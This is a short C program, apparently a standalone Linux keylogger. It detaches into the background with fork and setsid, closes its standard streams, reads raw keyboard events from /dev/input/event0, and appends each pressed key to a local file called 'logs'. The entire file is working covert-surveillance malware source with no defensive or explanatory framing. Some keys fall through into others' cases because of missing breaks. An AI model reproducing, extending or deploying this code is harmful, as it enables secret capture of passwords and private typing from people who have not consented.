#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
int main(void) {
  if (fork() > 0) {
    return 0;
  }
  setsid();
  close(STDIN_FILENO);
  close(STDOUT_FILENO);
  close(STDERR_FILENO);
  FILE *fp = fopen("logs", "a");
  int fd = open("/dev/input/event0", O_RDONLY);
  if (fd == -1) {
    printf("does not have perms\n");
    return 1;
  }
  while (1) {
    size_t size = lseek(fd, 0, SEEK_END);
    struct input_event buf;
    read(fd, &buf, sizeof(buf));
    if (buf.type == EV_KEY && buf.value == 1) {
      printf("%d\n", buf.value);
      switch (buf.code) {
        case KEY_ENTER: {
          fprintf(fp, "\n");
          break;
        }
        case KEY_ESC:  {
          fprintf(fp, "[esc]");
          break;
        }
        case KEY_1: {
          fprintf(fp, "1");
          break;
        }
        case KEY_2: {
          fprintf(fp, "2");
          break;
        }
        case KEY_3:  {
          fprintf(fp, "3");
          break;
        }
        case KEY_4: {
          fprintf(fp, "4");
          break;
        }
        case KEY_5: {
          fprintf(fp, "5");
          break;
        }
        case KEY_6:  {
          fprintf(fp, "6");
          break;
        }
        case KEY_7: {
          fprintf(fp, "7");
          break;
        }
        case KEY_8: {
          fprintf(fp, "8");
          break;
        }
        case KEY_9: {
          fprintf(fp, "9");
          break;
        }
        case KEY_0: {
          fprintf(fp, "0");
          break;
        }
        case KEY_A: {
          fprintf(fp, "a");
          break;
        }
        case KEY_B:  {
          fprintf(fp, "b");
          break;
        }
        case KEY_C: {
          fprintf(fp, "c");
          break;
        }
        case KEY_D: {
          fprintf(fp, "d");
          break;
        }
        case KEY_E:  {
          fprintf(fp, "e");
          break;
        }
        case KEY_F: {
          fprintf(fp, "f");
          break;
        }
        case KEY_G: {
          fprintf(fp, "g");
          break;
        }
        case KEY_H:  {
          fprintf(fp, "h");
          break;
        }
        case KEY_I: {
          fprintf(fp, "i");
          break;
        }
        case KEY_J: {
          fprintf(fp, "j");
          break;
        }
        case KEY_K: {
          fprintf(fp, "k");
          break;
        }
        case KEY_L: {
          fprintf(fp, "l");
          break;
        }
        case KEY_M:  {
          fprintf(fp, "m");
          break;
        }
        case KEY_N: {
          fprintf(fp, "n");
          break;
        }
        case KEY_O: {
          fprintf(fp, "o");
          break;
        }
        case KEY_P:  {
          fprintf(fp, "p");
          break;
        }
        case KEY_Q: {
          fprintf(fp, "q");
          break;
        }
        case KEY_R: {
          fprintf(fp, "r");
          break;
        }
        case KEY_S:  {
          fprintf(fp, "s");
          break;
        }
        case KEY_T: {
          fprintf(fp, "t");
          break;
        }
        case KEY_U: {
          fprintf(fp, "u");
          break;
        }
        case KEY_V: {
          fprintf(fp, "v");
          break;
        }
        case KEY_W: {
          fprintf(fp, "w");
          break;
        }
        case KEY_X:  {
          fprintf(fp, "x");
          break;
        }
        case KEY_Y: {
          fprintf(fp, "y");
          break;
        }
        case KEY_Z: {
          fprintf(fp, "z");
          break;
        }
        case KEY_SEMICOLON: {
          fprintf(fp, ";");
        }
        case KEY_CAPSLOCK: {
          fprintf(fp, "[capslock]");
        }
        case KEY_APOSTROPHE: {
          fprintf(fp, "'");
        }
        case KEY_GRAVE: {
          fprintf(fp, "`");
          break;
        }
        case KEY_EQUAL: {
          fprintf(fp, "=");
          break;
        }
        case KEY_MINUS: {
          fprintf(fp, "-");
          break;
        }
        case KEY_LEFTBRACE: {
          fprintf(fp, "{");
          break;
        }
        case KEY_RIGHTBRACE:  {
          fprintf(fp, "}");
          break;
        }
        case KEY_BACKSLASH:  {
          fprintf(fp, "\\");
          break;
        }
        case KEY_COMMA:  {
          fprintf(fp, ",");
          break;
        }
        case KEY_DOT:  {
          fprintf(fp, ".");
          break;
        }
        case KEY_SLASH:  {
          fprintf(fp, "/");
          break;
        }
        case KEY_SPACE:  {
          fprintf(fp, " ");
          break;
        }
        case KEY_KPASTERISK:  {
          fprintf(fp, "*");
          break;
        }
      }
      fflush(fp);
    }
  }
}
